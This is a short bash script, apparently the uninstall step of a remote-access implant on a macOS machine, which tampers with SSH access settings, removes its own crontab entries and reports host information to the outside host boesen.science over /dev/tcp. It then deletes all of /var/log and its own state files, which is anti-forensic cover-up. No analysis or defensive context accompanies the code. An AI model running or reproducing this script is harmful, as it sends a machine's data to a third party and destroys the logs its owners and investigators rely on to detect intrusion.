#!/bin/bash

rm -rf /var/root/.ssh

dscl . change /Groups/com.apple.access_ssh-disabled RecordName com.apple.access_ssh-disabled com.apple.access_ssh >/dev/null

grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

printf "$(< /etc/info) leaving network." >/dev/tcp/boesen.science/2043
rm -rf /var/log/*
rm -rf /etc/info /etc/ips
